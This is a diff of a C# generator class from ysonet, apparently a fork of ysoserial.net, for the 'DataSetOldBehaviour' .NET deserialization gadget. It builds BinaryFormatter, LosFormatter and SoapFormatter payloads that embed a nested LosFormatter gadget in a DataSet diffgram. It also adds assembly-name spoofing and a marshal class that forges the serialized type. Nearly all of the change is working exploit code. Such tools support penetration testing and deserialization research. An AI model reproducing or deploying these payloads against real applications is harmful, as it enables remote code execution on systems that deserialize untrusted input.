@@ -2,25 +2,30 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
+using System.Runtime.Serialization;
 using System.Text;
-using System.Threading.Tasks;
-using ysonet.Generators;
 using ysonet.Helpers;
 using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;
 
 namespace ysonet.Generators
 {
+    /*
+     * This is a gadget that targets an old behavior of DataSet which uses XML format.
+     * Why old behaviour? Because of a comment in the code:
+     * https://github.com/microsoft/referencesource/blob/main/System.Data/System/Data/DataSet.cs#L323 -> } else { // old behaviour
+     * 
+     */
+
     internal class DataSetOldBehaviourGenerator : GenericGenerator
     {
         private int variant_number = 1; // Add variant support
-        string spoofedAssembly = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
-        
+        string spoofedAssembly = "";
+
         public override OptionSet Options()
         {
             OptionSet options = new OptionSet()
             {
-                {"spoofedAssembly=", "The assembly name you want to use in the generated serialized object (example: 'mscorlib')", v => spoofedAssembly = v },
+                {"spoofedAssembly=", "The assembly name you want to use in the generated serialized object (example: 'mscorlib' or use 'default' for System.Data)", v => spoofedAssembly = v },
                 {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2", v => int.TryParse(v, out this.variant_number) },
             };
 
@@ -48,11 +53,6 @@ namespace ysonet.Generators
             return info;
         }
 
-        public override string Name()
-        {
-            return "DataSetOldBehaviour";
-        }
-
         public override string Finders()
         {
             return "Steven Seeley, Markus Wulftange, Khoa Dinh";
@@ -65,7 +65,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.BridgeAndDerived };
+            return new List<string> { GadgetTags.Bridged };
         }
 
         public override List<string> SupportedFormatters()
@@ -90,9 +90,11 @@ namespace ysonet.Generators
                 losFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("LosFormatter", inputArgs);
             }
 
+            var losFormatterPayloadString = Encoding.UTF8.GetString(losFormatterPayload);
+
             // Define XML schemas and deserializer callers based on variant
             string xmlSchema;
-            string xmlLosFormatterDeserializeCaller;
+            string xmlDiffGramLosFormatterDeserializeCaller;
 
             if (variant_number == 2)
             {
@@ -115,7 +117,7 @@ namespace ysonet.Generators
 </xs:schema>
 ";
 
-                xmlLosFormatterDeserializeCaller = @"<diffgr:diffgram xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
+                xmlDiffGramLosFormatterDeserializeCaller = @"<diffgr:diffgram xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
         <ds>
             <tbl diffgr:id=""Table"" msdata:rowOrder=""0"" >
                 <objwrapper xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
@@ -165,7 +167,7 @@ namespace ysonet.Generators
 </xs:schema>
 ";
 
-                xmlLosFormatterDeserializeCaller = @"<diffgr:diffgram
+                xmlDiffGramLosFormatterDeserializeCaller = @"<diffgr:diffgram
     xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata""
     xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
 
@@ -198,116 +200,169 @@ namespace ysonet.Generators
                 if (inputArgs.UseSimpleType)
                 {
                     xmlSchema = XmlHelper.Minify(xmlSchema, new string[] { }, new string[] { });
-                    xmlLosFormatterDeserializeCaller = XmlHelper.Minify(xmlLosFormatterDeserializeCaller, new string[] { }, new string[] { });
+                    xmlDiffGramLosFormatterDeserializeCaller = XmlHelper.Minify(xmlDiffGramLosFormatterDeserializeCaller, new string[] { }, new string[] { });
                 }
                 else
                 {
                     xmlSchema = XmlHelper.Minify(xmlSchema, new string[] { }, new string[] { });
-                    xmlLosFormatterDeserializeCaller = XmlHelper.Minify(xmlLosFormatterDeserializeCaller, new string[] { }, new string[] { });
+                    xmlDiffGramLosFormatterDeserializeCaller = XmlHelper.Minify(xmlDiffGramLosFormatterDeserializeCaller, new string[] { }, new string[] { });
                 }
             }
 
-            xmlSchema = CommandArgSplitter.JsonStringEscape(xmlSchema);
-            xmlLosFormatterDeserializeCaller = CommandArgSplitter.JsonStringEscape(xmlLosFormatterDeserializeCaller);
+            xmlDiffGramLosFormatterDeserializeCaller = xmlDiffGramLosFormatterDeserializeCaller.Replace("%LosFromatterPayload%", losFormatterPayloadString);
 
-            var losFormatterPayloadString = Encoding.UTF8.GetString(losFormatterPayload);
 
-            xmlLosFormatterDeserializeCaller = xmlLosFormatterDeserializeCaller.Replace("%LosFromatterPayload%", losFormatterPayloadString);
-
-            
-
-            var bf_json = @"[{""Id"": 1,
-    ""Data"": {
-      ""$type"": ""SerializationHeaderRecord"",
-      ""binaryFormatterMajorVersion"": 1,
-      ""binaryFormatterMinorVersion"": 0,
-      ""binaryHeaderEnum"": 0,
-      ""topId"": 1,
-      ""headerId"": -1,
-      ""majorVersion"": 1,
-      ""minorVersion"": 0
-}},{""Id"": 2,
-    ""TypeName"": ""Assembly"",
-    ""Data"": {
-      ""$type"": ""BinaryAssembly"",
-      ""assemId"": 2,
-      ""assemblyString"": ""%SPOOFED%""
-}},{""Id"": 3,
-    ""TypeName"": ""ObjectWithMapTypedAssemId"",
-    ""Data"": {
-      ""$type"": ""BinaryObjectWithMapTyped"",
-      ""binaryHeaderEnum"": 5,
-      ""objectId"": 1,
-      ""name"": ""System.Data.DataSet,System.Data"",
-      ""numMembers"": 2,
-      ""memberNames"":[""XmlSchema"",""XmlDiffGram""],
-      ""binaryTypeEnumA"":[1,1],
-      ""typeInformationA"":[null,null],
-      ""typeInformationB"":[null,null],
-      ""memberAssemIds"":[0,0],
-      ""assemId"": 2
-}},{""Id"": 5,
-    ""TypeName"": ""ObjectString"",
-    ""Data"": {
-      ""$type"": ""BinaryObjectString"",
-      ""objectId"": 4,
-      ""value"": """ + xmlSchema + @"""
-}},{""Id"": 6,
-    ""TypeName"": ""ObjectString"",
-    ""Data"": {
-      ""$type"": ""BinaryObjectString"",
-      ""objectId"": 5,
-      ""value"": """ + xmlLosFormatterDeserializeCaller+ @"""
-}},{""Id"": 12,
-    ""TypeName"": ""MessageEnd"",
-    ""Data"": {
-      ""$type"": ""MessageEnd""
-}}]";
-
-            bf_json = bf_json.Replace("%SPOOFED%", spoofedAssembly);
-
-            MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(bf_json);
-
-            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
+            if (!string.IsNullOrEmpty(spoofedAssembly))
             {
-                //BinaryFormatter
-                if (inputArgs.Test)
+                if (spoofedAssembly.ToLower() == "default")
                 {
-                    try
-                    {
-                        ms_bf.Position = 0;
-                        SerializersHelper.BinaryFormatter_deserialize(ms_bf);
-                    }
-                    catch (Exception err)
-                    {
-                        Debugging.ShowErrors(inputArgs, err);
-                    }
+                    spoofedAssembly = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
                 }
-                return ms_bf.ToArray();
-            }
-            else if(formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
-            {
-                // LosFormatter
-                MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);
 
-                if (inputArgs.Test)
+                // Making the payloads safe for JSON 
+                xmlSchema = CommandArgSplitter.JsonStringEscape(xmlSchema);
+                xmlDiffGramLosFormatterDeserializeCaller = CommandArgSplitter.JsonStringEscape(xmlDiffGramLosFormatterDeserializeCaller);
+
+                var bf_json = @"[{""Id"": 1,
+        ""Data"": {
+          ""$type"": ""SerializationHeaderRecord"",
+          ""binaryFormatterMajorVersion"": 1,
+          ""binaryFormatterMinorVersion"": 0,
+          ""binaryHeaderEnum"": 0,
+          ""topId"": 1,
+          ""headerId"": -1,
+          ""majorVersion"": 1,
+          ""minorVersion"": 0
+    }},{""Id"": 2,
+        ""TypeName"": ""Assembly"",
+        ""Data"": {
+          ""$type"": ""BinaryAssembly"",
+          ""assemId"": 2,
+          ""assemblyString"": ""%SPOOFED%""
+    }},{""Id"": 3,
+        ""TypeName"": ""ObjectWithMapTypedAssemId"",
+        ""Data"": {
+          ""$type"": ""BinaryObjectWithMapTyped"",
+          ""binaryHeaderEnum"": 5,
+          ""objectId"": 1,
+          ""name"": ""System.Data.DataSet,System.Data"",
+          ""numMembers"": 2,
+          ""memberNames"":[""XmlSchema"",""XmlDiffGram""],
+          ""binaryTypeEnumA"":[1,1],
+          ""typeInformationA"":[null,null],
+          ""typeInformationB"":[null,null],
+          ""memberAssemIds"":[0,0],
+          ""assemId"": 2
+    }},{""Id"": 5,
+        ""TypeName"": ""ObjectString"",
+        ""Data"": {
+          ""$type"": ""BinaryObjectString"",
+          ""objectId"": 4,
+          ""value"": """ + xmlSchema + @"""
+    }},{""Id"": 6,
+        ""TypeName"": ""ObjectString"",
+        ""Data"": {
+          ""$type"": ""BinaryObjectString"",
+          ""objectId"": 5,
+          ""value"": """ + xmlDiffGramLosFormatterDeserializeCaller + @"""
+    }},{""Id"": 12,
+        ""TypeName"": ""MessageEnd"",
+        ""Data"": {
+          ""$type"": ""MessageEnd""
+    }}]";
+
+                bf_json = bf_json.Replace("%SPOOFED%", spoofedAssembly);
+
+                MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(bf_json);
+
+                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                 {
-                    try
+                    //BinaryFormatter
+                    if (inputArgs.Test)
                     {
-                        ms_bf.Position = 0;
-                        SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
+                        try
+                        {
+                            ms_bf.Position = 0;
+                            SerializersHelper.BinaryFormatter_deserialize(ms_bf);
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
                     }
-                    catch (Exception err)
-                    {
-                        Debugging.ShowErrors(inputArgs, err);
-                    }
+                    return ms_bf.ToArray();
                 }
-                return ms_lf.ToArray();
+                else if (formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
+                {
+                    // LosFormatter
+                    MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);
+
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            ms_bf.Position = 0;
+                            SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
+                    }
+                    return ms_lf.ToArray();
+                }
+                else
+                {
+                    throw new Exception("Formatter not supported");
+                }
             }
             else
             {
-                throw new Exception("Formatter not supported");
+                // We use the DataSetXmlMarshal to serialize the DataSet with the XML schema and diffgram
+                DataSetXmlMarshal dsMarshal = new DataSetXmlMarshal(xmlSchema, xmlDiffGramLosFormatterDeserializeCaller);
+                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
+                {
+                    return Serialize(dsMarshal, formatter, inputArgs);
+                }
+                else
+                {
+                    throw new Exception("Formatter not supported");
+                }
             }
+        }
+    }
+
+
+    [Serializable]
+    public class DataSetXmlMarshal : ISerializable
+    {
+        string _xmlSchema = "";
+        string _xmlDiffGram = "";
+        Type _derivedType = typeof(System.Data.DataSet);
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(_derivedType);
+            info.AddValue("XmlSchema", _xmlSchema);
+            info.AddValue("XmlDiffGram", _xmlDiffGram);
+        }
+
+        public void SetXmlData(string xmlSchema, string xmlDiffGram)
+        {
+            _xmlSchema = xmlSchema;
+            _xmlDiffGram = xmlDiffGram;
+        }
+
+        public void SetDerivedType(Type type)
+        {
+            _derivedType = type;
+        }
+
+        public DataSetXmlMarshal(string xmlSchema, string xmlDiffGram)
+        {
+            SetXmlData(xmlSchema, xmlDiffGram);
         }
     }
 }
